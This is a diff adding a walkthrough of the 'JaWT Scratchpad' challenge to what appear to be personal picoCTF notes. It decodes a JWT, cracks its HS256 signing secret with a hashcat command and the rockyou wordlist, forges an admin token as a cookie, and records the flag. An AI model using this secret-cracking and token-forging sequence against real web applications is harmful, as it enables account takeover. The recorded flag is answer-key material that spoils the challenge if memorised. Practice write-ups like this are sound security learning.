@@ -120,4 +120,37 @@ PY
     - sstv -d ~/Documents/git_hub/ctf/cylabacademy/challenge-lib/medium/message.wav \
     - picoCTF{beep_boop_im_in_space}
 
+23. JaWT Scratchpad ->
+    - eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y
+  
+    - Header: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
+        {
+          "typ": "JWT",
+          "alg": "HS256"
+        }
+
+    - Payload: eyJ1c2VyIjoiam9obiJ9 
+        {
+          "user": "john"
+        }
+
+    - Signature: _fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y
+        this is the result of: 
+            HMACSHA256( Base64Url(header) + "." + Base64Url(payload), secret )
+            then combined with a secret to form: _fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y
+
+jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.WZ4kQqx55FHtBkGrN6lwtYR-_F9ANbgQUKRCAPIf_7Q;
+Path=/
+
+- hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --show
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y:ilovepico
+
+- JWT with ilovepico:
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9.AMuH3A1TJcRUktdMkvEvVsbSJKJyf5oRglFMVGZuXz0
+
+Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
+- picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}
+
 23. 
